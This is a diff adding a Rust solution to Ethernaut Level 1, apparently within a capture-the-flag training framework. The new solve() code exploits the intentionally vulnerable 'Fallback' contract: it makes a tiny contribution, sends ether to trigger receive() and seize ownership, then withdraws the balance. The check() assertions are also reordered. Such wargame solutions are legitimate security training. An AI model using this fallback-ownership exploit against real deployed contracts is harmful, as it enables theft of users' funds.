@@ -62,8 +62,25 @@ impl Level for EthernautLevel1 {
     - Fallback methods
     ";
 
-    async fn solve(&self, _offender: Actor) -> eyre::Result<()> {
-        todo!("Solve me")
+    async fn solve(&self, offender: Actor) -> eyre::Result<()> {
+        let contract = Fallback::new(self.contract_address, offender.clone());
+
+        println!("Calling contribute()...");
+        contract.contribute().value(1).send().await?.await?;
+
+        println!("Calling receive()...");
+        offender
+            .send_transaction(
+                TransactionRequest::new().to(contract.address()).value(1),
+                None,
+            )
+            .await?
+            .await?;
+
+        println!("Calling withdraw()...");
+        contract.withdraw().send().await?.await?;
+
+        Ok(())
     }
 
     async fn check(self, roles: Roles) -> eyre::Result<EthernautLevel1> {
@@ -71,13 +88,13 @@ impl Level for EthernautLevel1 {
         let contract = Fallback::new(self.contract_address, deployer.clone());
 
         println!("Checking that you claimed ownership of the contract...");
+        let owner = contract.owner().await?;
+        assert_eq!(owner, offender.address());
+
+        println!("Checking that you reduced its balance to 0...");
         let contract_balance =
             deployer.get_balance(self.contract_address, None).await?;
         assert_eq!(contract_balance, U256::from(0));
-
-        println!("Checking that you reduced its balance to 0...");
-        let owner = contract.owner().await?;
-        assert_eq!(owner, offender.address());
 
         Ok(self)
     }
